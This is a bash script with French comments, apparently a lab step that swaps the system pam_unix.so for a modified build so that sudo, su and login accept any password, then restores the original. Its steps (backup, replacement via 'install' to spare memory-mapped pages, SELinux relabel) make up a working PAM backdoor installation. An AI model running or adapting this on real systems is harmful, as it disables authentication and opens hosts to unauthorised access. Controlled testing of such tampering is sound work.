#!/usr/bin/env bash
#
# Manipulation D : Substitution du module pam_unix.so par une version modifiee.
# Cible : /usr/lib64/security/pam_unix.so
# Prerequis : le module modifie doit avoir ete compile au prealable
#             (script prepare_d.sh).
# Test : sudo, su, login acceptent tout mot de passe.
#
# IMPORTANT : utiliser `install` (et non `cp`) pour eviter la corruption des
# pages memory-mappees des processus actifs.
#

set -euo pipefail
SYSTEM_MODULE="/usr/lib64/security/pam_unix.so"
BACKUP_MODULE="${SYSTEM_MODULE}.bak"
MODIFIED_MODULE="$HOME/linux-pam/builddir/modules/pam_unix/pam_unix.so"

echo "=== Manipulation D : module pam_unix.so modifie ==="
echo

# --- Prerequis ---
if [[ ! -f "$MODIFIED_MODULE" ]]; then
    echo "ERREUR : module modifie introuvable : $MODIFIED_MODULE"
    echo "Executer d'abord scripts/prepare_d.sh"
    exit 1
fi

# --- Sauvegarde ---
echo "[1/5] Sauvegarde du module systeme"
sudo cp "$SYSTEM_MODULE" "$BACKUP_MODULE"
ls -la "$BACKUP_MODULE"

# --- Substitution ---
# install : unlink puis create -> nouvel inode -> pas de corruption des mmap
echo "[2/5] Substitution via 'install' (preserve les mmap actifs)"
sudo install -m 755 "$MODIFIED_MODULE" "$SYSTEM_MODULE"
sudo restorecon -v "$SYSTEM_MODULE"
ls -la "$SYSTEM_MODULE"

# --- Test ---
echo
echo ">>> Test : sudo -k && sudo whoami doit accepter tout mot de passe."
echo ">>> Le prompt de mot de passe s'affiche toujours, mais la valeur est ignoree."
echo
read -p "Appuyer sur [Entree] une fois le test effectue, pour restaurer..." _

# --- Restauration ---
echo "[3/5] Restauration via 'install' (meme contrainte mmap)"
sudo install -m 755 "$BACKUP_MODULE" "$SYSTEM_MODULE"
sudo restorecon -v "$SYSTEM_MODULE"

# --- Verification ---
echo "[4/5] Verification de la taille (doit egaler l'original) :"
ls -la "$SYSTEM_MODULE"
echo "[5/5] Verification du comportement (sudo doit redemander le mot de passe) :"
sudo -k
sudo whoami
